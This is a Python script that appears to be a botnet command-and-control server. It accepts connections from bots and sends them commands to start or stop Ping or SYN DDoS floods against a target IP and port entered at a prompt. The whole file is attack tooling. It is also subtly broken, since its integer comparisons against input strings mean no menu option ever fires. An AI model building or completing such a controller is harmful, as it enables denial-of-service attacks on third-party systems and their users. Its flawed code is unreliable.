import socket
import threading
import time
import sys

def commands():
	print("""Enter a number to send commands to bots...
		1. Start DDoS attack
		2. Stop DDoS attack
		3. Exit botnet program""")
	option = input("Enter option number: ")
	
	if option == 1:
		target_ip = input("Enter target IP address: ").encode()
		target_port = input("Enter target port: ").encode()
		ddos_type = input("Enter type of DDoS attack (Ping/SYN): ").encode()
		for bot in bots:
			bot.send("DDoS_".encode() + target_ip + "_".encode() + target_port + "_".encode() + ddos_type)
		print("Starting DDoS on target...")
		time.sleep(5)
	
	if option == 2:
		for bot in bots:
			bot.send("Stop DDoS".encode())
		print("Stopping DDoS on target...")
		time.sleep(5)

	if option == 3:
		for bot in bots:
			bot.send("Exit program".encode())
			bot.close()
		print("Exiting program...")
		sys.exit()
	
	else:
		print("You entered an invalid option!")

ip = "localhost" #Attacker's machine IP
port = 9999
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((ip, port))
sock.listen(5)
bots = []
print("Waiting for connections...")


while True:
	bot, ip = sock.accept()
	bots.append(bot)
	print("{} successfully connected!".format(ip))
	commands()
